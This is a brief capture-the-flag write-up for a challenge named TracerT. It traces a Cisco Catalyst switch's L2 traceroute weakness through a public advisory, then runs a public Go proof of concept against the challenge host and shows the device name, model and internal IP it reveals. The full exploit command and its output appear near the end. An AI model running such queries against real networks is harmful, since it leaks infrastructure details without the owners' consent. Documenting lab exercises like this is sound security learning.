A sort of basic writeup for TracerT:

The following will not work with the switches FQDN tracert.cg21.mctf.io.

You can find the switches IP address with a DNS lookup like so:

`dig tracert.cg21.mctf.io +short`

After fiddling around a while with snmp and failing I decided to search for Cisco security advisories instead.

You can look at the cisco security advisories here and search for traceroute:
https://tools.cisco.com/security/center/publicationListing.x?product=Cisco&keyword=Traceroute&sort=-day_sir#~Vulnerabilities

Which leads to this informational report:
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190925-l2-traceroute#recommendations

Here the L2 traceroute feature is explained as well as its weakness.
The feature is enabled by default on Catalyst Switches.
At the bottom the security researcher Chris Marget is mentioned, who discovered the weakness.

You can find him on twitter and github.
On Github he has a repo with a working proof of concept written in Go.
https://github.com/chrismarget/cisco-l2t

Clone his repo and run the cmd/l2t_ss/main.go script like so:

`go run main.go -t 1 -a 1:ffff.ffff.ffff -a 2:ffff.ffff.ffff -a 3:100 -a 14:0.0.0.0 34.207.70.151`

My output:
```
git:(master) $ go run main.go -t 1 -a 1:ffff.ffff.ffff -a 2:ffff.ffff.ffff -a 3:100 -a 14:0.0.0.0 34.207.70.151
Received: L2T_REPLY_DST (3) with 4 attributes (51 bytes)
   4 L2_ATTR_DEV_NAME     thats-tracer-t-to-u
   5 L2_ATTR_DEV_TYPE     WS-C2950T-24
   6 L2_ATTR_DEV_IP       192.168.28.125
  15 L2_ATTR_REPLY_STATUS Status unknown (3)
```
